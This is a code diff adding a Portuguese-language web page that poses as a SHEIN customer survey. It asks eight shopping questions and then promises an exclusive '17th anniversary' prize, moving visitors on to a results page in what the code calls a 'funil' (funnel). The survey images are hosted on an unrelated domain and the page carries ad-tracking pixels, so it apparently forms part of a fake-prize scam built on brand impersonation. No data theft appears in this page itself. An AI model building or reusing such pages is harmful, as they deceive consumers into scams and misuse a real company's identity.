@@ -1,0 +1,89 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<meta charset="utf-8">
+<!-- UTMify Pixel -->
+<script>
+  window.pixelId = "679fb0f4bbdfc9f47bf2c735";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script>
+<!-- UTMify UTM -->
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>SHEIN | Questionário</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="stylesheet" href="css/shein.css">
+<script src="js/shared.js"></script>
+</head>
+<body>
+<div id="app-header"></div>
+<main id="app" style="transition:opacity .15s ease"></main>
+<div id="app-footer"></div>
+<script>
+(function(){
+  mountChrome(28);
+  var SM=StepManager('app');
+  var QImg={q1:'https://s3.atendimento-br.lat/typebot/public/workspaces/cmnpeeglq00017lz43hepps6y/typebots/cmnpnzz1n0004qxw5441zyxtx/blocks/whr17iofzsncb4j80wz5bqr2?v=20260813a',q2:'https://s3.atendimento-br.lat/typebot/public/workspaces/cmnpeeglq00017lz43hepps6y/typebots/cmnpnzz1n0004qxw5441zyxtx/blocks/vr0i4kapj0a1cvtnwh3j7d71?v=20260813a',q3:'https://s3.atendimento-br.lat/typebot/public/workspaces/cmnpeeglq00017lz43hepps6y/typebots/cmnpnzz1n0004qxw5441zyxtx/blocks/favoqbv0hyop245a71srq928?v=20260813a',q4:'https://s3.atendimento-br.lat/typebot/public/workspaces/cmnpeeglq00017lz43hepps6y/typebots/cmnpnzz1n0004qxw5441zyxtx/blocks/jmdt2mzy8qte9m5kcxwsxtl8?v=20260813a',q5:'https://s3.atendimento-br.lat/typebot/public/workspaces/cmnpeeglq00017lz43hepps6y/typebots/cmnpnzz1n0004qxw5441zyxtx/blocks/rd8ps0sfdzpvfqcgmggn8bjt?v=20260813a',q6:'https://s3.atendimento-br.lat/typebot/public/workspaces/cmnpeeglq00017lz43hepps6y/typebots/cmnpnzz1n0004qxw5441zyxtx/blocks/tivx6nkes3dwy2yt1c7dgjse?v=20260813a',q7:'https://s3.atendimento-br.lat/typebot/public/workspaces/cmnpeeglq00017lz43hepps6y/typebots/cmnpnzz1n0004qxw5441zyxtx/blocks/nsj6qdv9buo8e2gi4ojk85ln?v=20260813a',q8:'https://s3.atendimento-br.lat/typebot/public/workspaces/cmnpeeglq00017lz43hepps6y/typebots/cmnpnzz1n0004qxw5441zyxtx/blocks/i58hsdyyy3q0cq0cvdfzo351?v=20260813a',congrats:'https://s3.atendimento-br.lat/typebot/public/workspaces/cmnpeeglq00017lz43hepps6y/typebots/cmnpnzz1n0004qxw5441zyxtx/blocks/lz2f7fpjvwupykh8b1viqomy?v=20260813a'};
+  var QUESTIONS=[
+    {img:QImg.q1,text:'Voc\u00ea j\u00e1 adquiriu algum produto da SHEIN?',options:['Sim, j\u00e1 sou cliente','Ainda n\u00e3o sou cliente','N\u00e3o sei']},
+    {img:QImg.q2,text:'O que mais te chama aten\u00e7\u00e3o em nossos produtos?',options:['Qualidade','Tecnologia e inova\u00e7\u00e3o','Design','Suporte ao cliente','Outro']},
+    {img:QImg.q3,text:'Com que frequ\u00eancia voc\u00ea faz compras na SHEIN?',options:['Semanalmente','Mensalmente','A cada dois meses','Raramente']},
+    {img:QImg.q4,text:'Quais tipos de produtos voc\u00ea mais compra na SHEIN?',options:['Roupas femininas','Roupas masculinas','Roupas infantis','Cal\u00e7ados']},
+    {img:QImg.q5,text:'Quais s\u00e3o os fatores mais importantes ao escolher um produto na SHEIN?',options:['Pre\u00e7o','Qualidade','Estilo','Tend\u00eancias da moda','Coment\u00e1rios de outros clientes']},
+    {img:QImg.q6,text:'Qual \u00e9 a sua experi\u00eancia geral de navega\u00e7\u00e3o no site/app da SHEIN?',options:['Muito f\u00e1cil','F\u00e1cil','Neutra','Dif\u00edcil','Muito dif\u00edcil']},
+    {img:QImg.q7,text:'Qu\u00e3o satisfeita voc\u00ea est\u00e1 com o tempo de entrega dos produtos da SHEIN?',options:['Muito satisfeita','Satisfeita','Neutra','Insatisfeita','Muito insatisfeita']},
+    {img:QImg.q8,text:'Quais estilos de roupa voc\u00ea gostaria de ver mais na SHEIN?',options:['Casual','Esportivo','Formal','Vintage','Alternativo']}
+  ];
+  var PROG=[28,32,36,40,44,48,52,56];
+
+  function qStep(i){
+    SM.add('q'+i,function(){
+      var q=QUESTIONS[i];
+      return '<div class="step-enter wrap-md px-4 py-6">'
+        +'<span class="pill mb-4" style="background:#fce7f3;color:#be185d">PERGUNTA '+(i+1)+' DE 8</span>'
+        +'<div class="relative w-full rounded-2xl overflow-hidden bg-gray-100 mt-3 mb-4" style="aspect-ratio:4/3">'
+          +'<img src="'+q.img+'" alt="Pergunta '+(i+1)+'" class="absolute inset-0 w-full h-full object-cover" onerror="this.style.display=\'none\'">'
+        +'</div>'
+        +'<h2 class="text-xl font-extrabold mb-5">'+q.text+'</h2>'
+        +'<div class="space-y-3">'+q.options.map(function(o,oi){return '<button class="qopt option-card w-full text-left border-2 border-gray-200 rounded-xl px-4 py-4 font-medium text-gray-700 flex items-center gap-3" data-i="'+oi+'"><span class="qradio w-5 h-5 rounded-full border-2 border-gray-300 flex-shrink-0"></span><span>'+o+'</span></button>';}).join('')+'</div>'
+      +'</div>';
+    },function(){
+      setProgress(PROG[i]);
+      var btns=document.querySelectorAll('.qopt');
+      btns.forEach(function(b){b.onclick=function(){
+        btns.forEach(function(x){x.className='qopt option-card w-full text-left border-2 border-gray-200 rounded-xl px-4 py-4 font-medium text-gray-700 flex items-center gap-3';x.querySelector('.qradio').className='qradio w-5 h-5 rounded-full border-2 border-gray-300 flex-shrink-0';});
+        b.className='qopt option-card w-full text-left border-2 border-black bg-gray-50 rounded-xl px-4 py-4 font-semibold text-gray-900 flex items-center gap-3';
+        b.querySelector('.qradio').className='qradio w-5 h-5 rounded-full border-2 border-black bg-black flex items-center justify-center flex-shrink-0';
+        b.querySelector('.qradio').innerHTML='<span class="text-white text-[11px]">\u2713</span>';
+        setTimeout(function(){if(i<7)SM.go('q'+(i+1));else SM.go('complete');},350);
+      };});
+    });
+  }
+  for(var k=0;k<8;k++)qStep(k);
+
+  /* ============ QUIZ COMPLETE ============ */
+  SM.add('complete',function(){
+    setProgress(60);
+    return '<div class="step-enter wrap-md px-4 py-10 text-center">'
+      +'<div class="relative w-full rounded-2xl overflow-hidden bg-gray-100 mb-5" style="aspect-ratio:4/3">'
+        +'<img src="'+QImg.congrats+'" alt="Parab\u00e9ns" class="absolute inset-0 w-full h-full object-cover" onerror="this.style.display=\'none\'">'
+      +'</div>'
+      +'<h2 class="text-2xl font-extrabold mb-3">Question\u00e1rio conclu\u00eddo! \uD83C\uDF89</h2>'
+      +'<p class="text-gray-600 mb-7">Obrigado por responder. Agora vamos liberar a sua <strong>premia\u00e7\u00e3o exclusiva</strong> de 17 anos da SHEIN.</p>'
+      +'<button id="qc-cta" class="btn-primary w-full rounded-xl py-4 text-base">Ver minha premia\u00e7\u00e3o \u2192</button>'
+    +'</div>';
+  },function(){
+    LS.set('funil_quiz_completo','1');fireConfetti(50);
+    document.getElementById('qc-cta').onclick=function(){__funilNav('../resultado/index.html');};
+  });
+
+  SM.go('q0');
+})();
+</script>
+
+
+</body></html>
